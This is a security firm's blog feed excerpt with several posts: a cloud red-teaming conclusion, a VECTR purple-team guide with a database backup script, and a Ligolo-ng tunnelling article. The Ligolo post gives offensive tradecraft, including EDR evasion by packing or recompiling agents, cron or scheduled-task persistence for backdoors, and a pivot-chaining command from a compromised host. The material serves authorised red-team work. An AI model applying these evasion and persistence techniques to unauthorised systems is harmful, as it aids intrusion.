&lt;p&gt;Data gathering is crucial and still prevalent in both on-premise and cloud engagements. However, the places and the means change substantially. File storage and database servers that were previously secured behind a corporate firewall may now be left exposed due to misconfigurations, resulting in an accidental reliance on ‘security through obscurity’ for business-critical assets and data. Attackers who have phished the right user account may end up connecting to cloud resources from anywhere in the world. Gone are the days when a VPN connection was necessary to reach critical internal resources, as cloud platforms expose their logins and APIs publicly. With a single authentication to cloud platforms an adversary has a foothold in the target cloud environment and all its offerings.&lt;/p&gt;
&lt;p&gt;In response to the evolving landscape of data storage, exchange and security, new methods for extracting sensitive data are emerging. Attackers are increasingly abusing vendor APIs for reconnaissance purposes, as exemplified by the Microsoft Graph API. Only recently we were made aware of a technique using text-to-speech immersive reading features to retrieve and ‘read out’ credential material you should not have access to! Yet again this shows how common features can be exploited, and underscores the need for heightened vigilance in this space. Additionally, we have seen Artificial Intelligence (AI) being trained on the target’s internal blueprints, documents, email exchanges and instant messaging logs to make informed decisions about potential targets within an organisation, whether they are humans, or machines. This raises concerns about the evolving sophistication of cyberattacks and the need to stay ahead as red teamers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The cloud’s shared responsibility model has changed the security landscape, as customers cannot assess the security of the systems hosting their data from the ground-up anymore. In many cases, cloud providers leave them to develop the knowledge required to be able to securely administer cloud services, and by doing so open the door for myriad cloud misconfigurations.&lt;/p&gt;
&lt;p&gt;As we at JUMPSEC gain more experience with cloud red teaming we have come to appreciate the major, and minor, shifts in perspective that are necessary when targeting cloud environments. Gone are the days of being highly exploit-centric red teamers, when the success in cloud environments can, in large part, come down to the understanding and abuse of cloud configurations and functionality. Whilst ‘popping shells’ will never lose its novelty, it is often less impactful than going after key identities within the cloud environment. However, what really excites us is the knowledge that there remains so much to explore and evolve in cloud red teaming. It is for this reason that we are dedicating so much time and energy to stay ahead in this burgeoning area of offensive security.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>VECTR for Purple Team Engagements</title>
      <link>//localhost:1313/articles/2023/09/2023-09-29-vectr-for-purple-team-engagements/</link>
      <pubDate>Fri, 29 Sep 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/09/2023-09-29-vectr-for-purple-team-engagements/</guid>
      <description>
        
        
        &lt;h2&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As anyone who has conducted a lengthy purple team engagement will tell you, logging and centralising the huge amount of data from these engagements can quickly become overwhelming. In the past we have seen attempts to use generic productivity software, such as Sharepoint, to attempt to track the huge number of activities and logs generated by both the red and blue teams. However, as you can imagine, shoehorning large quantities of engagement data from two teams with different operating procedures into a single application not built for this purpose can be…tricky.&lt;/p&gt;
&lt;p&gt;As purple team enthusiasts, we believe we have found a better solution to this problem, and sharing that with the wider security community is the purpose of this blog post. We also want to share some guidance when using this framework to help others avoid making the mistakes we have in the past.&lt;/p&gt;
&lt;h2&gt;What is VECTR?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-is-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-is-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First of all, what is VECTR? VECTR is an open-source purple team framework that can assist in all phases of purple team exercises, from planning and executing test cases to sharing the relevant information with clients and colleagues. At its core, VECTR is a tool that enables red and blue teams to work together towards a common goal. The framework helps with streamlining operations, enhancing collaboration, and provides advanced reporting capabilities which we have found to be very useful. It allows purple teams to achieve a more comprehensive and proactive approach to improving security by highlighting the gaps that will help build, or improve, defensive controls.&lt;/p&gt;
&lt;p&gt;However, keep in mind that VECTR is still just a tool in your arsenal and it will not automate the above-mentioned tasks for you (at least not yet!). It therefore still requires a certain amount of manual labour for planning and entering test cases, maintaining and setting up the hosting server and importing libraries or backing up your databases. However, as a framework it does a good job of organising what can often become an enormous and convoluted data set of a lengthy purple team into something manageable and built for purpose.&lt;/p&gt;
&lt;h2&gt;Setup and Backup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setup-and-backup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setup-and-backup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The framework was developed by SRA (SecurityRiskAdvisors), it’s open-source and is available here: &lt;a href=&#34;https://www.google.com/url?q=https://github.com/SecurityRiskAdvisors/VECTR&amp;amp;sa=D&amp;amp;source=editors&amp;amp;ust=1695990756685968&amp;amp;usg=AOvVaw0izs_1WzGwrSSxOt8_V-8j&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/SecurityRiskAdvisors/VECTR&lt;/a&gt;. The setup is relatively straightforward and can be achieved by following the installation documentation located at &lt;a href=&#34;https://www.google.com/url?q=https://docs.vectr.io/Installation/&amp;amp;sa=D&amp;amp;source=editors&amp;amp;ust=1695990756686426&amp;amp;usg=AOvVaw16aNSRVjOiaTb-Vhgj5OYr&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.vectr.io/Installation/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.gif&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Starting up the VECTR instance.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;starting-up-the-vectr-instance&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#starting-up-the-vectr-instance&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;VECTR stores engagement data in a MongoDB database. When delivering purple team engagements this database can be exported and has, in our case, been included as a deliverable to be used by our clients to explore the details of the engagement in their own time.&lt;/p&gt;
&lt;p&gt;As VECTR will soon become the home of all of your important engagement data, it is crucial to have regular backups! To eliminate human error we create a cron job which executes a script that backs up the VECTR’s mongo database. We have shared this below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
#  1. the script logs into the vectr box via ssh 
#   and executes mongodump on the mongo container -
#        to save a snapshot of VECTR&amp;#39;s database in /tmp.
#  2. the dump is then moved out of the docker container 
#   and on the hosting box&amp;#39;s /tmp folder, archived as .tgz.
# 3. using scp, a copy of the database dump is move onto your 
#   local machine in ~/PurpleTeam/VECTR_Backups
#
now=$(date &amp;#34;&amp;#43;%b_%d_%Y_%H.%M&amp;#34;)
echo backup day and month:&amp;#34;$now&amp;#34;

# run mongodump in the container, put it in the /tmp/ directory in the container. 
# This is using the default password and default container name:
ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 &amp;#34;docker exec -w /tmp purpleteam-vectr-mongo-1 /bin/bash -c &amp;#39;mongodump --username mongouser --password mongopsw --authenticationDatabase admin&amp;#34;

# copy the file out of the container:
ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 &amp;#34;docker cp purpleteam-vectr-mongo-1:/tmp/dump$now.tgz .&amp;#34;

# copy the file to local machine:
scp -i ~/.ssh/vectr_box_rsa root@10.10.0.10:&amp;#34;/root/dump$now.tgz&amp;#34; ~/PurpleTeam/VECTR_BACKUPS/&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h6&gt;&lt;em&gt;The above script can be used and executed regularly using a cronjob.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-above-script-can-be-used-and-executed-regularly-using-a-cronjob&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-above-script-can-be-used-and-executed-regularly-using-a-cronjob&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/crontabvectr.png&#34; title=&#34;crontabvectr&#34; alt=&#34;crontabvectr&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;crontabvectr&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;img src=&#34;images/image6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;The picture shows the crontab that execute the backup script every 30 minutes.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-picture-shows-the-crontab-that-execute-the-backup-script-every-30-minutes&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-picture-shows-the-crontab-that-execute-the-backup-script-every-30-minutes&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;In the worst case scenario, the mongo database can be restored to another VECTR instance running on a different box:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Copy the database backup onto the new machine and then copy it to the VECTR’s 
# mongo container using the following command:
docker cp /home/ubuntu/dump.tgz instance_name-vectr-mongo-1:/home/
# Extract the database inside the docker container:
tar -xzvf dump.tgz
# Enter the container using bash:
docker exec -it instance_name-vectr-mongo-1 bash
# It is now possible to restore the database using the following command on the 
# VECTR hosting container:
mongorestore ./databasename -db --username mongodbuser --password mongodbpassword --authenticationDatabase admin&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h6&gt;&lt;em&gt;Procedure to restore a mongodb database on VECTR.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;procedure-to-restore-a-mongodb-database-on-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#procedure-to-restore-a-mongodb-database-on-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Key Features&lt;span class=&#34;absolute -mt-20&#34; id=&#34;key-features&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#key-features&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Here are some of the features that we believe make VECTR an attractive option for purple teamers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Easy deployment&lt;/li&gt;
&lt;li&gt;Atomic Red Team integration&lt;/li&gt;
&lt;li&gt;Automation of test cases execution via custom runtimes&lt;/li&gt;
&lt;li&gt;Maintenance and backup integrations&lt;/li&gt;
&lt;li&gt;Reporting features (charts and graphs)&lt;/li&gt;
&lt;li&gt;MITRE Navigator integration&lt;/li&gt;
&lt;li&gt;Detection rules libraries&lt;/li&gt;
&lt;li&gt;Customisation options&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One of the things we love about VECTR is how clearly it was built for purple team engagements. As you can see below, each test case is split into red team and blue team. This allows for the red team to carry out a test case and log the outcome, evidence and change the status of the test case ready for the blue team. Built into the same test case item you have a section for the blue team to update if it was detected, prevented or alerted, and provide their own evidence. There really is no other tool we have found that makes centralising engagement activity so straightforward.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;How the Red and Blue team collaboration experience looks like in VECTR.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-the-red-and-blue-team-collaboration-experience-looks-like-in-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-the-red-and-blue-team-collaboration-experience-looks-like-in-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;&lt;img src=&#34;images/image5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;Atomic Red Team&lt;span class=&#34;absolute -mt-20&#34; id=&#34;atomic-red-team&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#atomic-red-team&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As many purple teamers know, Atomic Red Team (ART) is a collection of Tactics, Techniques and Procedures (TTPs) that can speed up the process of identifying gaps in detection and response controls. It does this by automating the execution of techniques that are commonly carried out by advanced threat groups, allowing you to cover far more ground than manual testing alone. VECTR provides a nifty out-of-the-box integration for this library that can then be used to build specific “campaigns” (as labelled by VECTR). VECTR will generate an executable file in which all of your selected TTPs can be conducted one after another, hugely speeding up the process of mimicking the TTPs of a wide range of threat actors. We found that this freed up more time for the manual activities, whilst still allowing us to get wide coverage.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Importing the ART library on VECTR to be used in our campaigns.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;importing-the-art-library-on-vectr-to-be-used-in-our-campaigns&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#importing-the-art-library-on-vectr-to-be-used-in-our-campaigns&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;The techniques can be individually “deployed” and executed on a target system (Windows, MacOS or Linux) or performed sequentially by leveraging the “Automation Runtime” executable generated from the VECTR dashboard.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Selecting techniques to include in the Automation Runtime executable.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;selecting-techniques-to-include-in-the-automation-runtime-executable&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#selecting-techniques-to-include-in-the-automation-runtime-executable&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;&lt;img src=&#34;images/image7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Individual techniques compiled through VECTR’s Automation Runtime feature.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;individual-techniques-compiled-through-vectrs-automation-runtime-feature&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#individual-techniques-compiled-through-vectrs-automation-runtime-feature&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Reporting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reporting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reporting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Finally, we mentioned that we leverage the charts and graphics implemented in VECTR. The data and information logged in your test cases can be easily converted into visual representations of the security estate. We have found this to be especially useful when presenting to executive or non-technical audiences.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;A pie chart generated off the test cases carried out and their result.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;a-pie-chart-generated-off-the-test-cases-carried-out-and-their-result&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#a-pie-chart-generated-off-the-test-cases-carried-out-and-their-result&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In summary, we found VECTR to be an exceptional tool for purple team engagements and collaborative projects that require both red and blue teams working together. The framework provides a great number of features out of the box, as well as opportunities for customisation. For this reason, we continue to use it during our purple team engagements and would like to extend a thank you to the team over at SRA for maintaining it.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Ligolo: Quality of Life on Red Team Engagements</title>
      <link>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</link>
      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</guid>
      <description>
        
        
        &lt;p&gt;**&lt;figure&gt;
    &lt;img src=&#34;images/ligolo-bugsbunny-2023-06-09_12-50-300x267.png&#34; title=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; alt=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;ligolo bugsbunny 2023 06 09 12 50&lt;/figcaption&gt;
  &lt;/figure&gt;**In recent months we, JUMPSEC’s red team, have been using a nifty little tool that we would like to share with you in this blog post. Ligolo-ng is a versatile tool that has been aiding our covert, and slightly-less-covert, engagements with regards to tunnelling, exfiltration, persistence, and widely improving the operators’ “quality of life” when carrying out assessments involving beaconing from within an internal network.&lt;/p&gt;
&lt;p&gt;This highly-useful tool is developed by Nicolas Chatelain and can be found on Github at &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;. Ligolo can be described as a modern tunnelling tool, similar to the likes of chisel, sshuttle or SSH, with the advantage of being written in GO and behaving just like a VPN. That is to say, when setup correctly operators can enjoy connections to a target network of up to 100 Mbits/sec, utilising various protocols such as ICMP (ping), UDP scans, SYN stealth scan, OS detection and DNS Resolution, which are commonly not allowed through proxychains or “standard” tunnelling tooling.&lt;/p&gt;
&lt;p&gt;The tool uses agents on the compromised machine which connect to a publicly-facing proxy server to route traffic through a tun interface that is created on the host. In simple terms, Ligolo offers red teamers an alternative C2 channel that supports far more than traditional SSH or SOCKS proxies, allowing you to run a wider variety of tooling, much faster, and with what feels like too-good-to-be-true quality of life.&lt;/p&gt;
&lt;p&gt;The gif below shows how quick it is to setup the proxy server on a linux host machine after downloading the proxy executable from the releases’ page on Github.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/latest_ligolo_demo_setup5.gif&#34; title=&#34;latest ligolo demo setup5&#34; alt=&#34;latest ligolo demo setup5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;latest ligolo demo setup5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More and more, when using this tool, we discover features applicable to new use-cases. For example, beside its ease of use, things like using ping and private domain name resolution during a red team engagement are invaluable and can definitely improve the turnaround time and efficiency of an assessment. Once the necessary steps have been taken, as detailed below, operators can enjoy their entire suite of red team tooling on their linux server, with full name resolution, and speeds that are incomparable with that of traditional tunnelling on red team engagements. We have jokingly referred to Ligolo as allowing you to move your C2 into the target network!&lt;/p&gt;
&lt;p&gt;Furthermore, it is possible to set up listeners on deployed agents to welcome connections coming from agents deployed somewhere else in the target environment. Crucially, the agents do not require any privileged permissions to be executed on the compromised hosts, because of its “gvisor” implementation, which works by virtualising sandboxed containers that translate traffic reaching the central proxy server deployed on our host.&lt;/p&gt;
&lt;p&gt;As previously mentioned, GO makes it highly versatile and flexible, allowing operators to customise the proxy as well as the agents, and compile them to bypass defences or implement additional capabilities that are not there by default.&lt;/p&gt;
&lt;p&gt;For example, we found ourselves able to bypass common endpoint detection and response (EDR) mechanisms employed in a Windows environment by simply either packing the agent executable (something like Nimcrypt will do), removing unimportant pieces of code, restructuring the source-code, or by compiling the agents beforehand and adding extra flags to the syntax, such as the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GOOS=windows GOARCH=amd64 go build -ldflags=&amp;quot;-s -w&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Researchers at JUMPSEC have also recently determined that, in at least several mature client environments, the creation of new network interfaces is not monitored. Therefore, should you find yourself wanting to deploy a Ligolo proxy server on a compromised machine (remember you don’t need admin permissions to deploy an agent but you do need it to deploy a proxy server!), and that it does not appear that monitoring is in place for tunnelling tools such as Ligolo by default, which makes it an attractive target when compared to existing C2 payloads. A note of caution however, EDRs may flag the “tunnelling” functionality when traffic is exchanged between the agent and the proxy.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/fry-takemymoney-300x300.png&#34; title=&#34;fry takemymoney&#34; alt=&#34;fry takemymoney&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;fry takemymoney&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once a successful connection has been established packets will be automatically (read automagically) routed to the intended target network, making it a seamless experience, and one that compares with the ease of which you would carry out operations in your own local network.&lt;/p&gt;
&lt;p&gt;The agents can be easily modified and trivially executed by a Scheduled Task or a Cron Job for backdoor purposes or to establish persistence. When trying to achieve domain dominance on an engagement we found we were having to spend far less time in fixing or maintaining our foothold when compared to the usual routines of dealing with beacons, port forwarding and SSH tunnelling. Furthermore, we found that generally there are less restrictions in regards to the traffic we are allowed to generate and forward through.&lt;/p&gt;
&lt;p&gt;As previously mentioned, another interesting capability of this tool is the possibility to create listeners on the agent themselves to chain connections as shown in the code block below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[Agent : domain\Administrator@VICTIM] &amp;gt;&amp;gt; listener_add --addr &amp;lt;agent_ip&amp;gt;:11601 --to &amp;lt;proxyserver_ip&amp;gt;:11601
INFO[0326] Listener created on remote agent!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This behaviour is particularly useful when the proxy server’s IP address is out of reach for the last deployed agent, but connection can be established from the final pivoted box to the adjacent network running a previously deployed ligolo’s agent, allowing a pass-through connection back to our proxy server leveraged by the agent listener/forwarder.&lt;/p&gt;
&lt;p&gt;Finally, some caveats to keep in consideration…Ligolo does not automatically recognise the subnets where traffic needs to be redirected to, therefore you will need to add your routes as you discover or need them, using something like “sudo ip route add 192.168.0.0/24 dev ligolo” on the proxy server’s host, and target’s nameservers to /etc/resolv.conf to use DNS instead of IP addresses in an internal network. Furthermore, do not expect your agents to automatically establish a tunnel when reconnecting to the proxy…an auto-connect feature needs to be developed in-house or wait for the feature to be released by the author. Finally, remember that when using it for client networks, you will need a publicly facing box reachable by the agents to listen for connections and execute commands from.&lt;/p&gt;
&lt;p&gt;All in all, Ligolo enabled us to speed up our engagements, made our shells more stable and reliable, allowed for a larger and more comprehensive gathering of our targets data, and helped us spend less time maintaining an important part of our persistent operational infrastructure. Most importantly, it avoids the use of tooling on-disk or even in memory, as only the raw traffic leaves the compromised machine.&lt;/p&gt;
&lt;p&gt;To conclude this blogpost, I just want to say (write) that we love Ligolo and we are very grateful to Nicolas Chatelain for creating this amazing instrument that we are proud to have in our day-to-day operational tool suite.&lt;/p&gt;
&lt;p&gt;References&lt;/p&gt;
&lt;p&gt;● The Cyber Plumber&amp;rsquo;s Handbook - &lt;a href=&#34;https://github.com/opsdisk/the&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/opsdisk/the&lt;/a&gt;_cyber_plumbers_handbook&lt;/p&gt;
&lt;p&gt;● Ligolo-ng - &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Gvisor - &lt;a href=&#34;https://gvisor.dev/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gvisor.dev/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Alternatives to Ligolo-ng:&lt;/p&gt;
&lt;p&gt;● Proxychains - &lt;a href=&#34;https://github.com/haad/proxychains&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/haad/proxychains&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Proxychains-ng - &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● Chisel - &lt;a href=&#34;https://github.com/jpillora/chisel&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;● SSHuttle - &lt;a href=&#34;https://github.com/sshuttle/sshuttle&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/sshuttle/sshuttle&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Hunting for &#39;Snake&#39;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</link>
      <pubDate>Fri, 26 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</guid>
      <description>
        
        
        &lt;p&gt;Following the NCSC and CISA’s detailed &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;joint advisory&lt;/a&gt; on the highly sophisticated ‘Snake’ cyber espionage tool, JUMPSEC threat intelligence analysts have provided a condensed blueprint for organisations to start proactively hunting for Snake within their network, contextualising key Indicators of Compromise (IoC), and providing additional methods to validate the effectiveness of Snake detections.&lt;/p&gt;
